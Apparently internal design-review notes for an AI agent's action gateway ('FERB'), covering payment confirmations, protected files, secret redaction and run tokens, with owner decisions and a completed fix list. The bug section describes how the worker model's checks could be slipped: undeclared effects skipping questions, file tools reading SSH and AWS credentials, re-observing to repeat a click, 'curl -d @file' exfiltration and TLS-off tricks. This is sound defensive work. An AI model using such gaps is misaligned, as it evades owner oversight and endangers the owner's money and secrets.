# Gateway, policy and secrets: decisions and fix list

Area: `ferb/daemon/gateway.py`, `auth.py`, `questions.py`, `ferb/orchestrator/ledger.py`, `ferb/policy/*`,
`ferb/sanitize/*`, the sealed fill path, and the run-token path (`ferb/cli/mcp.py`, `server.py`).
Basis: a read of every line (2026-10-30), pure-function tests on fake inputs, read-only DB counts. File:line refs
are to commit c6621c3. G = gateway.py.

## Owner decisions (2026-10-30)
1. **Tool facts + declaration decide pay / account security / delete / send.** Tools report structural facts (form
   submit and its action host, card/password field types, checkout amount on the page, the recipient a mail/message
   tool uses); facts raise the question; the worker's `effect` can only add.
2. **File tools follow the never-read and never-write lists**, like the shell; a task that needs one asks the owner
   (reads: once per protected folder per task, notes/hands.md decision 1; writes: per action). `fs_reads_never_read` goes (the 2026-10-11 setting is reversed).
3. **Superseded by notes/hands.md decision 4 (scope + snapshots).** Was: shell can't delete or move files outside FERB's workspace and the folders named in the task (sandbox rule);
   deletes elsewhere go through file tools (Trash + S1 copy), so they are recoverable. No new questions.
4. **One payment, one question** (owner, 2026-10-30; replaces "same amount, any site, 10 minutes"). Asked once when
   the final amount is known, with the amount and merchant read from the page by code (never the worker's number; if
   unreadable, the question says so). The Yes covers that payment in this task's tab and what it opens (card choice,
   bank page) until it completes or 10 minutes pass; another tab or task asks again. Where a bank verification page
   exists, code reads its amount and merchant and stops to ask again, showing both, if they differ from what was
   approved; an OTP question repeats the bank page's amount and merchant. Where there is no bank page (US cards,
   saved cards, one-click), the question is asked at the final pay/submit click with the amount read at that moment;
   a changed amount asks again. Known/mentioned sites never skip a payment question: every payment asks once.
   (Zomato order 400d67fb asked 6 times in 5 minutes for one ₹137.39 payment: one-click Yes, the card choice changing
   the account, the bank page changing the site, plus an outside-value question on the amount.)
5. **Known destinations** (owner, 2026-10-30): recipients and sites the owner approved stay known for good; sites
   mentioned in a request are known for normal use in that and later tasks; only sending private data there after
   outside content was read still asks once.
6. **Card details** (owner confirmed, 2026-10-30). Card fields (autocomplete cc-number / cc-csc / cc-exp) become secret
   fields like password and OTP fields (today `isSecret` covers only those, content.js:189): values never captured in
   snapshots, boxes masked in screenshots; card details filled only through the sealed path (stored once in the
   Keychain) or the site's / browser's saved card; the redactor also masks CVV beside its label and expiry beside a
   card, and the card-after-a-number bug is fixed. Storing a card works like other owner secrets today: the owner
   asks, or FERB asks, to store it; it goes to the Keychain through a hidden input; models see only its handle.

## What exists today (verified)

### Pipeline (`Gateway._call` G:714-871)
stop/alive → scope → observe-only → identity → strip notes (why/effect/destination) → validate → precheck →
owner.ask short-circuit → describe (code) + `rules.declare` (the worker's `effect`) → conversation guard →
files-closed (protection) → URL sink → provenance → test-mode allowlist → P19 ledger check → confirmations → span →
escape hatch → terminal input → `_held` (locks, disturbance) → `_execute` (ledger intend, S1 copy/snapshot, run,
redact, image redaction, origins).

### Security that depends on the worker's own declaration
- No tool reports PAY, ACCOUNT_SECURITY, DELETE_PERMANENT or SEND itself; browser inputs are CLICK/FILL_FORM, Mac
  input MAC_INPUT, fs delete only TRASH (browser/tools.py:780-786; fs/files.py:420). Only `mac.click`'s `purpose`
  adds send/call (mac/tools.py:558). Tested: a "Place order" click with no `effect` → no question; with
  `effect=pay` → `floor:pay`; `shell rm -rf ~/Documents` → no question even with `effect=destroy` (rules.py:62
  drops destroy on non-generic tools). The amount shown in the pay question is the worker's own.
- Private data typed into a form and submitted is not a sink unless `send` is declared (confirm.py:548).
- Test-mode send allowlist, standing permissions, conversation guard recipient checks all key off declared sends.
- Live: 11,328 of 13,318 tool calls declared no effect; pay declared 9 times, account_security 8, destroy 3.

### Protection lists vs file tools
- `fs_reads_never_read = true` (config.py:131 default; installed `~/.ferb/config.toml:85`) → `fs_denied` skips the
  never-read list (protection.py:378). Tested: `fs.read` of `~/.aws/credentials`, `~/.ssh/id_ed25519`, login
  keychain, Messages `chat.db`, Chrome `Login Data` all allowed. Code comment calls true the owner's setting (SQ3
  revised, commit 3fb1e7c, 2026-10-11).
- Never-write never binds file tools (protection.py:371): `fs.write ~/Library/LaunchAgents/x.plist`,
  `~/.ssh/authorized_keys`, `~/.zshrc` run with no question (S1 copy only). The shell sandbox denies all of these.
- Browser upload of `~/.ssh/id_ed25519` goes through the same check and asks nothing.

### Redaction (tested on fake values)
- Leaks: `aws_secret_access_key = …`, Stripe `sk_live_`/`rk_live_`/`sk_test_`, GitLab `glpat-`, `Authorization:
  Basic`, truncated PEM, PGP private keys, `https://TOKEN@host`, npm/HF/SendGrid/Twilio/Discord tokens, Cookie
  headers, `mysql -p…`, Azure AccountKey, unlabelled high-entropy strings (no entropy detector), a card number after
  another number (`qty 2 4111 1111 1111 1111`; CARD regex consumes the leading digits, redact.py:842-843).
- Masked: AKIA ids, GitHub, Slack, OpenAI, Anthropic, Google keys, JWT, complete PEM, Bearer, `password: x`,
  `DB_PASSWORD=`, URL `user:pass@`, labelled OTPs, cards.
- Dict keys never redacted; non-str values (ints, bytes) pass raw (redact.py:987-994, 1030-1044); dict and text use
  different vocabularies (`{"pin": …}` leaks as a dict, masked as text).
- Not idempotent (masking removes the context that exempted a value; single-pass consumption); one JSON case drops a
  key silently (`redacted_json({"a": "Password: '", "b": "typed key '"})`). Explains the 15 parked learning cards.
- Runs 4-5 times per tool result and per trail event, synchronously (~50-85 ms per pass on large results).
- Known-value registry not preloaded at startup; `daemon.err.log` is raw stderr with no exception hook.
- "Redaction would change it" also gates actions: terminal input refused (G:1469-1501; false refusals like
  `echo 'PIN 1234'`), input paths refused (main.py:4863), learning cards refused.

### Other confirmed bugs
- **P19 bypass by re-observing**: a click's ledger identity includes the snapshot-scoped element id
  (browser/tools.py:684-685; mac.click `shot` and x/y). After an unknown-outcome "Send", a new snapshot gives a new
  id, so the identical click runs again unasked.
- **Pay window key has no site or account** (confirm.py:510): ₹137.39 on zomato.com and on evil.com share one Yes
  for 10 minutes, a second identical order included.
- **Claude run token in argv** (claude_sdk.py:115-116 → SDK `--mcp-config`); Codex uses a 0600 file
  (codex_exec.py:280-292).
- **Owner's Yes spent by a conversation-guard refusal** (G:1588-1594).
- **Known destinations permanent and global** (destinations.py:54-59); any host in any request's words becomes known
  for good (supervisor.py:2250-2252), so later sink checks skip it. Decision 5 accepts this except for private-data sends after outside
  content was read.
- 30-minute window gateway-wide (G:427, 1308); window Yeses don't record destinations (G:1306-1312 vs 1345-1348).
- Foreground-in-browser misses Chrome Canary/Beta, Firefox, Vivaldi, Opera, Orion, Chromium, and an app name with
  U+200E (confirm.py:93-95, 134); `browser_page` misses `chrome-extension://` and `about:`.
- Terminal detection fails open when an editor's focused element can't be read (driver passes `[]`,
  driver.py:1039-1045, 1196-1199).
- TLS-off detection misses: heredoc into sh, `wget -e check_certificate=off`, GIT_CONFIG_COUNT, `node --eval=…`,
  deno, `printf … | sh`, `ssh host curl -k`, docker `--tls-verify=false`, and more.
- Any tool exception marks the ledger row unknown, even if it failed before acting (G:1605); only the browser
  bridge ever reconciles (ext_bridge.py:237-239). Live: 20 unknown rows, 0 retry approvals.
- Run tokens never expire when a task has no deadline (worker.py:338-340); revoked at worker end.
- Shell egress is open by design (L2): any remote host, LAN and 169.254.169.254 included; `curl -d @file
  https://new-host` asks nothing, so the browser URL sink (~200 lines of URL-token machinery) guards a channel the
  shell leaves open.

### Complexity
- gateway.py 2,480 lines, 279 if/elif lines, 37 getattr; 16 per-tool special cases; ~20 attributes injected from
  outside, each None default its own branch (some fail open: protection, recovery).
- The find → ask → record → claim cycle is written four times (`_confirmed`, `_url_sink` ×2, `_escape`,
  `_terminal`); admission copied in `_probe`; conversation guard runs twice; content redacted 2-3 times per path.
- Non-authorization features inside the authorization path: previews, cursor point, disturbance, initial image,
  evidence, memory lineage, change record, Jev shadow, hidden-input asks.
- Dead: `_look_later`/`_first_look`/`_look_done` and the `looks` machinery, `tools_for_task`, the DELETE_PERMANENT
  branches (G:1103-1111, 1571; confirm.py:516-518), legacy confirmation rules in the DB. (Step 3: the looks machinery
  and `tools_for_task` removed; the rest left.)

## Rulings (step 6a, technical)
- All reviewed OTP rules kept (email layouts, markup, backup-code lists): their tests guard real past leaks.
- Cards are checked over every window of digit groups (catches `qty 2 <card>`); grouped order numbers are masked a
  bit more often (about 19% vs 11%). Hiding too much is the safe side.
- Expiry is masked only in MM/YY form after an expiry label or right after a card; CVV only beside its label.
- The daemon preloads saved-secret values (and API keys only for runtimes in use) at start, so they're masked
  before their first fill. Test daemons never preload (an early test run read API-key entries from the owner's
  login Keychain inside a short-lived test process; values stayed in that process's memory, only a count was written,
  in a temp home since deleted; fixed and guarded by a test).

## Rulings (step 6b, technical)
- **Pipeline** (`Gateway._call`): `_admit` → `_build` (validate, notes stripped, precheck, describe, declaration,
  facts, P19 identity, locks) → `_boundaries` (conversation guard, never-lifted files, card digits typed, address with
  no site, unliftable escape, test mode, undelivered result, P19 repeat) → `_needs` (lifts, URL sink, `decide` over the
  kind + declaration and over each fact kind, bulk count, payment, foreground, browser page, pair, escape, terminal) →
  `_authorize` (the one find/ask/record/claim step) → `_grants` (lifted rules, escape grant + admin password, terminal
  grant) → `_run` (span, hooks, locks, P19 intend, S1, run, redact once). One call asks at most one question now (a
  terminal input with foreground, or a protected file with a URL sink, used to be two or three questions).
- **Facts → kinds** (decision 1): a submitted form with a card field (cc-number/cc-csc/cc-exp) → pay; with a
  current-password field together with a `new_password` field → account security (coordinator ruling: a sign-up's
  new-password field alone asks nothing; 2FA/recovery fields aren't structurally detectable yet); every submitted form →
  the sink rule only (coordinator ruling): asked only when a value typed or chosen into that tab
  (`SpanStore.typed_in_tab`) carries the owner's private data by provenance (`confirm.text_carries_private`, the URL
  check's value rules), after outside content was read, to the form's action host (else the page's) when the owner
  neither named it in this request nor approved it; a submit carrying no private value never asks, GET or POST, and
  never the new-recipient floor; a tool's `deletes` outside
  the Trash → permanent delete of each path (counted first if a folder). Each fact kind is decided with its own target
  and provenance; the union with the declaration's needs is asked, so nothing removes a question. The test-mode
  allowlist covers fact payments, not fact form submits (rule 22: sends, not every form).
- **One payment, one question** (decision 4, `ferb/policy/payments.py`): applies to a payment in a task's browser tab
  (`ActionFacts.tab_chain`, new: the first task tab of the chain that opened it; `_Tab.opener` for link tabs and adopted
  popups). A Mac app's payment is scoped the same way to its app window (bundle + window id from the call's stable
  P19 identity) for 10 minutes (coordinator ruling); a payment with neither (other tools) asks every run (SQ1),
  showing "an amount FERB couldn't read" unless the capability itself describes the amount; the worker's declared
  amount is never shown or keyed. Bank page =
  the tab moved to another host, or the input is in a frame of another host (a card frame of the payment gateway also
  counts: only a differing amount/merchant asks there). Completion, so the next payment asks: a call ran on a page of
  another host and the chain came back to the checkout's host; a second card form is submitted on the checkout; or
  (coordinator ruling, one-click) a paying form submit with no card form and no bank page before it ran: the Yes
  covered exactly that submit, the next one on the checkout asks, a verification page it opens is still covered.
  Amounts compare by currency (₹ = INR, $ = USD…; a side with no currency compares the number) and number; merchants
  case- and space-insensitively. An amount read where the approved one was unread asks again. Approvals live in
  memory (a restart asks again); a No is keyed by tab chain + amount + merchant and stays final. Residual: a one-click
  "Place order" that is a script button (no form submit fact) can't be told from the same payment's later clicks, so
  a second identical order through it in the same tab within 10 minutes is not asked again.
- **Known destinations** (decision 5): `KnownDestinations.approved` (how answered/confirmed) is the sink rule's test
  (`decide(..., approved=)` and the URL sink); `known` (any how) stays the new-recipient and outside-value test. A
  named destination is upgraded when the owner later approves it (upsert), never downgraded. Stored keys and values:
  the text when the redactor leaves it alone, `sha256:<digest>` when it would change it without a specific hit, never
  stored or matched when `Redactor.hit` finds a saved secret or a credential format.
- **Cards** (decision 6): `OwnerSecrets` records keep a `kinds` map for entries saved from a card field; such an entry
  fills only a field of the same kind, and a card field takes only an entry of its kind (or a one-time hidden input);
  `secrets.list` shows `card_details` (name → kind). The gateway refuses typed text into a card field and a Luhn-valid
  card number typed anywhere (`Redactor.hit` == "payment card"); browser `type` into card fields was already refused in
  the extension (5c).
- **P19**: an exception from the tool is "failed" (not unknown, retry not blocked, the owner's Yes released) when it is
  `Refused` (any subclass), a pydantic `ValidationError`, or carries `attempted = False`; anything else is unknown.
  The call's span is finished in `_run`'s handler whatever escapes (ledger, hooks, a cancel).
- **Conversation guard**: its second check (right before input) now comes before the attempt is marked started, so a
  refusal there releases the owner's one-run Yes.
- **Run tokens**: `RunTokens.revoke_tree` at tree end (`Desktop._tree_finished`); a task without a deadline keeps no
  expiry of its own, but no token outlives its tree.
- **Off the loop**: capabilities declaring `describe_in_thread` (all Mac tools) have describe, precheck, locks, P19
  identity and the foreground test run in a worker thread.
- **Hooks** (`ferb/daemon/call_hooks.py`): previews, FERB's cursor point, desktop samples, change record copies,
  initial image, image sanitizing, evidence, shadow advice, live line. Hidden input (`ferb/daemon/hidden_input.py`):
  owner secrets, login codes (an OTP question on a payment's later page repeats that page's amount and merchant, or the
  approved payment when unread), the admin password.
- **Disturbance** (daemon decision 5): sampled only around calls whose capability declares `on_screen`: Mac input,
  foreground, app open, shell commands (they can open apps) and, of the browser tools, only those that can open or
  raise a window (`browser.open`: FERB's minimized window or foreground mode; `browser.pair`; `browser.handoff`);
  input, navigation and reads in a task tab are not sampled (coordinator ruling); compared keys: front app, focused window, fullscreen,
  Space; per-call changes on the call's span output (`screen`) and in the task summary (`screen_changes`), and
  `DisturbanceSentinel.facts(task)` for the merged checker (step 8). A change found when the next on-screen call starts,
  with none in flight, is stated as before (P26).
- Left for later: legacy confirmation rows in the DB (inert: keyed by ended trees; step 12's cleanup); the remaining
  attributes set from outside (`standing`, `conversation_guard`, `observer`, `test_send_allowlist`).

## Target design
1. **One pipeline, one Need loop.** Admission → validate → tool-reported facts → `needs(facts)` (protection, pay,
   account security, delete, new recipient, sink, TLS-off, foreground, browser page, terminal, escape all as Need
   producers) → one lock/find/ask/record/claim step → P19 intend → run under locks with S1 → redact once → return.
   Previews, disturbance, evidence, lineage, change records become post-call hooks outside authorization.
2. **Facts before declarations.** Tools report structural facts (a form submit and its action host, card/password
   field types from autocomplete and input type, the checkout amount on the page, the recipient a mail/message tool
   uses); facts raise questions; the worker's `effect` can only add.
3. **P19 identity from stable targets** (page URL + backend node or AX path; app window + element), not snapshot ids
   or coordinates. A tool that failed before acting is not "unknown".
4. **Redaction rebuilt small and idempotent**: a preloaded known-value registry; one tested vendor-format table
   (AWS id+secret, Stripe, GitHub, GitLab, Slack, OpenAI, Anthropic, Google, npm, HF, SendGrid, Twilio, Discord,
   JWT, PEM/PGP incl. truncated, Basic/Bearer/Cookie headers, URL userinfo and signed params, cards with Luhn over
   every digit window); one label vocabulary for dict keys, `key=value` text, URL params and field metadata, plus an
   entropy check for values after credential-like keys; small OTP rules; spans found on the original text and masked
   once into a "redacted" wrapper so later sinks don't redo it; fuzz-tested. Dict keys and non-str values covered;
   an exception hook redacts `daemon.err.log`. Gates use a specific known-value or format hit, never "redaction
   changed it". Owner-decided details stay (address-code exemption, CODE_REACH 8, dictionary-word secrets).
5. Fixes without a decision: payment scope per decision 4 (one payment, one question); Claude token via a 0600
   file; conversation-guard Yes released; browser lists from installed apps (bundle ids) with U+200E stripped;
   browser-page check covers extension and about: pages; terminal detection fails closed when focus is unreadable;
   TLS list extended for the missed cases; run tokens expire with their task.

## Depends on
- notes/hands.md: tool-reported facts, card/secret fields, stable P19 identity, browser list, terminal facts
  (hands produces, gateway consumes).
- notes/daemon.md: composition (constructor deps replace injected attributes); disturbance sampler hooks into the
  post-call hooks built here.
- Redaction rebuild here also fixes the 15 parked memory cards (notes/memory.md).
- Shell egress stays open by owner decision L2; the browser URL sink therefore guards only browser navigation
  (accepted residual).

## Fix list
- [x] Single Need pipeline; remove the four duplicated confirmation loops (G:1086-1190, 1192-1255, 1418-1440, 1448-1490).
      (6b: `Gateway._needs` + `_authorize`, see Rulings (step 6b).)
- [x] Move non-authorization features out of `_call`/`_execute` into post-call hooks. (6b: `call_hooks.py`,
      `hidden_input.py`.)
- [x] Constructor-passed dependencies instead of ~20 injected attributes; protection and recovery fail closed.
      (Step 2: `GatewayDeps`, every field required, and `Gateway.__init__` refuses to start without recovery,
      confirmations, known destinations or the protection lists (gateway.py, "fail closed"). Step 12d: the last three
      set from outside went: standing permissions are one store built in composition and passed in `GatewayDeps.standing`
      (the supervisor uses the same one), and the orchestrator's observer and conversation guard arrive through one
      `Gateway.attach` call when the supervisor is built on top of the gateway. `test_send_allowlist` stays an attribute:
      it is runtime state the `test.mode` RPC changes, not wiring.)
- [x] Tool-reported facts for pay / account security / delete / send (decision 1). (5a: `ActionFacts` shape on
      ActionSpec/ToolResult, recorded untouched on the span; deciding from it is step 6. 5b: Mac tools report theirs.
      5c: browser tools report submit + host/method, field kinds, page amount/merchant, frame_host; deciding: step 6.)
- [x] P19 stable identity; failed-before-acting is not unknown. (5b: Mac identity via a capability's `ledger_args`
      in `hashed_args`. 5c: browser identity done (`BrowserAct.ledger_args`), and browser reads that fail are known
      failures, never unknown; the gateway's failed-before-acting rule is step 6.)
- [x] One payment, one question (decision 4): page-read amount and merchant; tab-chain scope; bank-page amount check;
      final-click check where there is no bank page; remove the separate outside-value question on a page amount.
- [x] Known destinations (decision 5): mentioned sites known except for private-data sends after outside reads.
      (6b: `approved`; stable keys.)
- [x] Card fields secret + sealed card fill + CVV/expiry redaction (decision 6). (5c: card fields are secret in the
      extension (values never captured, boxes painted, no typing or text keys, no login code into them) and reported
      as field kinds; filling one goes through browser.secret's sealed path today. 6a: the redactor masks CVV beside
      its label, expiry beside a card or its label, the CVV after a card and expiry, cards over every window of digit
      groups (`qty 2 4111 …` fixed), and a record's `cc-number`/`cc-csc`/`cc-exp` value. 6b: saved card details keep
      their field kind and fill only that kind; card digits typed in the clear are refused.)
- [x] Redaction rebuild (target 4). (6a, `ferb/sanitize/`: `known.py` registry (preloaded at start from FERB's
      Keychain handles and owner secrets, `Daemon._preload_secrets`; escaped forms incl. URL and HTML; a value of 6
      characters or fewer never matches inside a longer number), `formats.py` one named vendor table, `labels.py` one
      vocabulary (dict keys, `KEY=`, `"key":`, URL params, field metadata; entropy check after `*_KEY`-style keys)
      and the reviewed OTP rules, `redact.py` spans found on the text as given and masked once, then a fixed point,
      so `text(text(x)) == text(x)`; structures redacted by shape (keys too, colliding keys kept, ints, bytes);
      returned strings marked so later sinks skip them; `stream.py` rebuilt on the same rules. Gates ask
      `Redactor.hit` (known value or format): terminal input, chat `input_paths`, learning card storage. Process
      exception hooks write redacted tracebacks to stderr (`redacting_hooks`). Not changed: the destination and
      confirmation key checks in `policy/destinations.py`, which compare stored keys, not gate actions.)
- [x] Run tokens expire with the task (the Claude token file is owned by notes/runtimes.md). (6b: revoked at tree end.)
- [x] Conversation-guard Yes release (G:1588-1594).
- [x] Browser app list, U+200E, extension/about pages; terminal fail-closed; TLS cases. (5b: all but the TLS cases:
      browsers.py, `confirm.browser_page` covers extension schemes and about: pages except about:blank/srcdoc,
      `terminal.surface(unread=)`. 6b: TLS cases, see policy/tls.py's list.)
- [x] Window Yeses record destinations like normal Yeses; the 30-minute window stays daemon-wide (owner rule 9).
- [x] Keep the test-mode send allowlist step (live send tests, CLAUDE.md rule 22), set through config; no CLI command.
- [x] Remove dead code listed above. (6b: gateway-side done (NOT_RECORDED paths, `_nothing_known`, `Claimed`, the
      None-store branches); the DELETE_PERMANENT branches are reachable from facts now and stay. Left: legacy
      confirmation rows in the DB, step 12.)
      (Step 12d: the legacy rows need no code of their own: they belong to ended trees, and step 12a's retention deletes
      confirmations 90 days after their tree ends with the other operational records (ferb/store/retention.py
      `_BY_TASK`).)
- [x] File tools bound by never-read / never-write, lift: reads once per folder per task, writes per action (decision 2; hands decision 1).
      (5a: `Gateway._file_lifts`; 6b: folded into the single Need pipeline, `_lift_needs`.)
